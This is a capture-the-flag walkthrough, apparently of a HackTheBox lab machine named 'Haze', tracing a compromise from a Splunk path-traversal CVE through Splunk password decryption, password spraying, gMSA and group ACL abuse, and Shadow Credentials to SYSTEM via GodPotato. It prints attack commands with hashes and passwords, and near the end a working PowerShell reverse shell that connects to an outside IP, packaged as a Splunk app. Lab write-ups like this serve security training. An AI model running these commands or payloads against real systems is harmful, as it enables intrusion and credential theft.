# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts
#

#
dn:
namingcontexts: DC=haze,DC=htb
namingcontexts: CN=Configuration,DC=haze,DC=htb
namingcontexts: CN=Schema,CN=Configuration,DC=haze,DC=htb
namingcontexts: DC=DomainDnsZones,DC=haze,DC=htb
namingcontexts: DC=ForestDnsZones,DC=haze,DC=htb

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```

Anonymous LDAP read succeeds for naming context discovery, but any further enumeration requires authenticated credentials - the domain controller restricts anonymous bind:

{% image2 %}

The LDAP certificate in the NMAP output shows a CA issuer of `haze-DC01-CA`, confirming that Active Directory Certificate Services (AD CS) is deployed in the environment - a detail worth noting for potential certificate-based attack paths:

{% image3 %}

### Splunk Enumeration

The NMAP scan identifies three Splunk-related ports: 8000, 8088, and 8089:

{% image4 %}

Port 8000 hosts the Splunk Enterprise web interface login page:

{% image5 %}

Port 8088 returns a 404, and port 8089 serves the Splunk management REST API (Atom Feed). The Atom Feed exposes the running Splunk version without authentication:

{% image6 %}

Searching for vulnerabilities against this Splunk version reveals CVE-2024-36991 - an unauthenticated path traversal leading to arbitrary file read on Windows deployments:

{% image7 %}

The vulnerability allows reading any file accessible to the Splunk service account. The highest-value targets across a Splunk installation are:

```
Credentials & Secrets:
    /etc/passwd
    /etc/auth/splunk.secret
    /etc/auth/server.pem
    /var/run/splunk/session
    /etc/system/local/authentication.conf

Configuration Files:
    /etc/system/local/web.conf
    /etc/system/local/inputs.conf

Logs & History:
    /var/log/splunk/splunkd.log
    /var/log/splunk/audit.log
    /var/log/splunk/metrics.log
    /var/log/splunk/searches.log
    /var/run/splunk/dispatch

System & Service Files:
    /bin/splunk.exe
    /bin/splunkd.exe
    /etc/system/default/server.conf
    /etc/system/default/user-seed.conf
    /var/lib/splunk/persistentstorage.db

Apps & Custom Scripts:
    /etc/apps/Splunk_TA_windows/bin
    /etc/apps/Splunk_TA_nix/bin
    /etc/apps/SplunkForwarder/local
    /etc/apps/Splunk_SA_CIM/local
```

Using the [CVE-2024-36991 exploit script](https://github.com/jaytiwari05/CVE-2024-36991) to automatically extract the relevant files from the Splunk instance:

{% image8 %}

The two most valuable files are `authentication.conf`, which stores the LDAP bind credentials Splunk uses to authenticate against Active Directory, and Splunk's `/etc/passwd`, which lists the local Splunk accounts:

{% image9 %}

Splunk encrypts stored passwords using a key derived from `splunk.secret` - a file present on every Splunk installation. Since the file read vulnerability also exposes `splunk.secret`, the encrypted LDAP bind password from `authentication.conf` can be decrypted offline:

{% image10 %}

Installing `splunksecrets` and running the decryption:

{% image11 %}

The decrypted LDAP bind password is `Ld@p_Auth_Sp1unk@2k24`. The CN in `authentication.conf` references `Paul Taylor`, but a Common Name is not a reliable indicator of the actual AD username format - it reflects the display name, not the `sAMAccountName`. The extracted Splunk `/etc/passwd` provides a better starting point since its account names may match the domain format used in the environment:

{% image12 %}

Four candidates are available to test, including variations on the `Paul Taylor` name. None authenticate successfully, and appending the `2k25` year suffix (matching the box's 2025 release) also fails.

Generating AD-style username permutations using `namemash` - a script that produces common enterprise formats such as `firstname.lastname`, `firstnamelastname`, `f.lastname`, and similar patterns:

```python
#!/usr/bin/env python
import sys
import os.path

if __name__ == "__main__": 
    if len(sys.argv) != 2:
        print("usage: {} names.txt".format((sys.argv[0])))
        sys.exit(0)

    if not os.path.exists(sys.argv[1]): 
        print("{} not found".format(sys.argv[1]))
        sys.exit(0)

    for line in open(sys.argv[1]):
        name = ''.join([c for c in line if  c == " " or  c.isalpha()])

        tokens = name.lower().split()

        # skip empty lines
        if len(tokens) < 1: 
            continue

        fname = tokens[0]
        lname = tokens[-1]

        print(fname + lname)           # johndoe
        print(lname + fname)           # doejohn
        print(fname + "." + lname)     # john.doe
        print(lname + "." + fname)     # doe.john
        print(lname + fname[0])        # doej
        print(fname[0] + lname)        # jdoe
        print(lname[0] + fname)        # djoe
        print(fname[0] + "." + lname)  # j.doe
        print(lname[0] + "." + fname)  # d.john
        print(fname)                   # john
        print(lname)                   # joe

```

The generated username list:

{% image14 %}

Testing the candidate list against the domain with the decrypted password:

{% image15 %}

The format `paul.taylor` authenticates successfully. With valid domain credentials, `paul.taylor` holds standard low-privilege domain user access:

{% image16 %}

### Active Directory - Domain Enumeration

Mapping the full domain attack surface using `rusthound-ce` for BloodHound data collection and `adidnsdump` for DNS zone enumeration.

Running `rusthound-ce` with the `paul.taylor` credentials: `rusthound-ce --domain haze.htb --ldapusername 'paul.taylor' --ldappassword 'Ld@p_Auth_Sp1unk@2k24' --ldapfqdn DC01.haze.htb --ldapip 10.129.232.50 --name-server 10.129.232.50 --collectionmethod All --zip`

{% image17 %}

DNS zone enumeration via `adidnsdump` returns no notable records beyond the expected domain infrastructure:

{% image18 %}

Inspecting the BloodHound graph for `paul.taylor` shows limited outbound object control - a single path that does not immediately open a usable attack surface:

{% image19 %}

One anomaly stands out: the AUTHENTICATED USERS group appears incomplete in BloodHound. This is a known limitation that occurs when the collecting account lacks sufficient LDAP read rights to fully enumerate all group memberships and object properties - a restricted permissions configuration rather than an error in the collection:

{% image20 %}

RID brute-forcing bypasses this restriction entirely. Rather than querying LDAP object properties, it iterates through Security Identifiers to enumerate users and groups, which is unaffected by LDAP read restrictions:

{% image21 %}

The full domain user list from the RID brute-force:

```bash
SMB         10.129.232.50   445    DC01             500: HAZE\Administrator (SidTypeUser)
SMB         10.129.232.50   445    DC01             501: HAZE\Guest (SidTypeUser)
SMB         10.129.232.50   445    DC01             502: HAZE\krbtgt (SidTypeUser)
SMB         10.129.232.50   445    DC01             1000: HAZE\DC01$ (SidTypeUser)
SMB         10.129.232.50   445    DC01             1103: HAZE\paul.taylor (SidTypeUser)
SMB         10.129.232.50   445    DC01             1104: HAZE\mark.adams (SidTypeUser)
SMB         10.129.232.50   445    DC01             1105: HAZE\edward.martin (SidTypeUser)
SMB         10.129.232.50   445    DC01             1106: HAZE\alexander.green (SidTypeUser)
SMB         10.129.232.50   445    DC01             1111: HAZE\Haze-IT-Backup$ (SidTypeUser)
```

Parsing into a clean username list:

```bash
➜  haze cat smb_rid_brute.txt | grep SidTypeUser | awk '{print $6}' | cut -d '\' -f 2
Administrator
Guest
krbtgt
DC01$
paul.taylor
mark.adams
edward.martin
alexander.green
Haze-IT-Backup$
```

Password spraying the complete user list with the known password:

{% image22 %}

The account `mark.adams` shares the same password as `paul.taylor`. Re-running BloodHound data collection as `mark.adams` to obtain a complete domain picture:

{% image23 %}

The AUTHENTICATED USERS group now populates fully, confirming that `mark.adams` carries no LDAP read restrictions and can enumerate all domain objects:

{% image24 %}

Checking the group memberships for `mark.adams` reveals it belongs to Remote Management Users, granting WinRM access to the machine:

{% image25 %}

### gMSA Account Abuse

Connecting via WinRM as `mark.adams` and enumerating the local system yields nothing directly actionable. Running `bloodyAD` to enumerate the ACL permissions this account holds over domain objects:

{% image26 %}

`mark.adams` holds write permissions over `Haze-IT-Backup$`, which is a Group Managed Service Account (gMSA). The `PrincipalsAllowedToRetrieveManagedPassword` attribute on a gMSA controls which security principals can request its automatically managed password. Write access over the account means this attribute can be overwritten to grant retrieval rights to any chosen principal.

Confirming the ACL with PowerView's `Get-DomainObjectAcl`:

We can confirm this by using [powerview.py](http://powerview.py) to see more details: `python3 /opt/powerview.py/powerview.py haze.htb/mark.adams:'Ld@p_Auth_Sp1unk@2k24'@DC01.haze.htb`

To confirm this we can use `Get-DomainObjectAcl -Identity Haze-IT-Backup -ResolveGUIDs`

{% image27 %}

Inspecting the full object properties with `Get-DomainObject -Identity Haze-IT-Backup -Properties *` reveals the `msDS-GroupMSAMembership` attribute, which encodes the `PrincipalsAllowedToRetrieveManagedPassword` value, contains a SID:

{% image28 %}

Converting the SID to identify which principal currently controls gMSA password retrieval:

{% image29 %}

Domain Admins currently holds retrieval rights. Since `mark.adams` has write permissions over the account object, the `msDS-GroupMSAMembership` attribute can be overwritten to include `mark.adams` as an authorized principal:

```bash
bloodyAD -i 10.129.232.50 -d haze.htb -u 'mark.adams' -p 'Ld@p_Auth_Sp1unk@2k24' set object 'CN=Haze-IT-Backup,CN=Managed Service Accounts,DC=haze,DC=htb' msDS-GroupMSAMembership -v 'O:S-1-5-21-323145914-28650650-2368316563-1104D:(A;;0xf01ff;;;S-1-5-21-323145914-28650650-2368316563-1104)'
```

{% image30 %}

With the attribute modified, the gMSA password hash is now retrievable using the `--gmsa` flag in NetExec:

{% image31 %}

### Pivoting Inside of The AD

The `Haze-IT-Backup$` gMSA account holds `WriteOwner` over the `SUPPORT_SERVICES` group:

{% image32 %}

Following the pattern established with `paul.taylor` - where restricted LDAP read rights produced an incomplete BloodHound graph - re-running the collection as the gMSA account ensures any outbound edges from `SUPPORT_SERVICES` are fully visible. Using `impacket-getTGT` to obtain a Kerberos ticket for the gMSA and re-collecting with `--kerberos` authentication.

The updated BloodHound data reveals that `SUPPORT_SERVICES` holds the ability to perform a Shadow Credentials attack or force a password change on `edward.martin`:

{% image33 %}

The abuse chain requires three steps: claiming ownership of the group, granting the `WriteMembers` right, and adding the gMSA to the group. Starting by taking ownership:

```bash
➜  haze impacket-owneredit -action write -new-owner 'Haze-IT-Backup$' -target 'SUPPORT_SERVICES' 'haze.htb'/'Haze-IT-Backup$' -hashes :76da32697ff38bc7c9fa6289abf47940 -dc-ip 10.129.232.50
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Current owner information below
[*] - SID: S-1-5-21-323145914-28650650-2368316563-512
[*] - sAMAccountName: Domain Admins
[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=haze,DC=htb
[*] OwnerSid modified successfully!
```

Granting the `WriteMembers` right to `Haze-IT-Backup$`:

```bash
➜  haze impacket-dacledit -action 'write' -rights 'WriteMembers' -principal 'Haze-IT-Backup$' -target-dn 'CN=SUPPORT_SERVICES,CN=USERS,DC=HAZE,DC=HTB' -dc-ip 10.129.232.50 'haze.htb'/'Haze-IT-Backup$' -hashes :76da32697ff38bc7c9fa6289abf47940
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] DACL backed up to dacledit-20260626-144142.bak
[*] DACL modified successfully!
```

Adding the gMSA to the group:

```bash
➜  haze bloodyAD -d haze.htb -i 10.129.232.50 -u 'Haze-IT-Backup$' -p :76da32697ff38bc7c9fa6289abf47940 --host DC01.haze.htb add groupMember support_services 'Haze-IT-Backup$'
[+] Haze-IT-Backup$ added to support_services
```

With `Haze-IT-Backup$` now a member of `SUPPORT_SERVICES`, performing a Shadow Credentials attack against `edward.martin`. Shadow Credentials works by injecting a Key Credential into the target account's `msDS-KeyCredentialLink` attribute, then using the attacker-controlled certificate to obtain a TGT via PKINIT and derive the account's NTLM hash:

{% image34 %}

The NTLM hash for `edward.martin` is now available for authentication:

{% image35 %}

### Privilege Escalation

Inspecting the group memberships for `edward.martin` confirms it belongs to Remote Management Users. Connecting via `evil-winrm` retrieves the user flag:

{% image36 %}

The account is also a member of `Backup_Reviewers`, and a `Backups` directory exists at `C:\`:

{% image37 %}

The `Backup_Reviewers` group holds read and execute permissions on the `Backups` directory, propagating to all files and subfolders within it. Write, modify, and delete access are not granted.

Inspecting the archive contents with `tree /F` reveals a compressed Splunk backup:

{% image38 %}

Extracting `authentication.conf` and `splunk.secret` from the backup archive and repeating the same decryption process yields a new set of credentials. The BloodHound data shows that `alexander.green` is a member of the Splunk Admins group:

{% image39 %}

The decrypted password is `Sp1unkadmin@2k24`. The earlier Splunk `/etc/passwd` listed a local `admin` account - testing that username against the Splunk web interface on port 8000:

{% image40 %}

Authentication succeeds. Splunk Enterprise allows administrators to install custom apps, and apps can execute scripts on the underlying host under the Splunk service account context. This is the standard technique for achieving code execution through Splunk - packaging a reverse shell payload as a `.spl` app archive and installing it via the admin interface:

{% image41 %}

Using the [reverse_shell_splunk](https://github.com/0xjpuff/reverse_shell_splunk) toolkit to prepare the payload app:

```bash
➜  bin git:(master) ✗ cat run.ps1
#Uncomment and change the hardcoded IP address and port number in the below line. Remove all help comments as well.
$client = New-Object System.Net.Sockets.TCPClient('10.10.15.241',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

Packaging the app directory into a `.tgz` archive:

```bash
➜  reverse_shell_splunk git:(master) ✗ tar -czvf reverse_shell_splunk.tgz reverse_shell_splunk
reverse_shell_splunk/
reverse_shell_splunk/default/
reverse_shell_splunk/default/inputs.conf
reverse_shell_splunk/bin/
reverse_shell_splunk/bin/run.bat
reverse_shell_splunk/bin/rev.py
reverse_shell_splunk/bin/run.ps1
```

Renaming to the `.spl` extension Splunk expects and uploading via the admin interface: `mv reverse_shell_splunk.tgz reverse_shell_splunk.spl`

{% image42 %}

The app installs and the reverse shell connects back:

{% image43 %}

Running `whoami /priv` shows the shell carries `SeImpersonatePrivilege`. This privilege allows impersonating any Windows token that authenticates to the current process, including the SYSTEM token. GodPotato exploits this by coercing a SYSTEM-level COM object activation and impersonating the resulting token to gain elevated code execution:

{% image44 %}

Uploading GodPotato to the target and executing it:

{% image45 %}

Reading the root flag directly: `.\potato.exe -cmd "cmd /c type C:\Users\Administrator\Desktop\root.txt"`

{% image46 %}
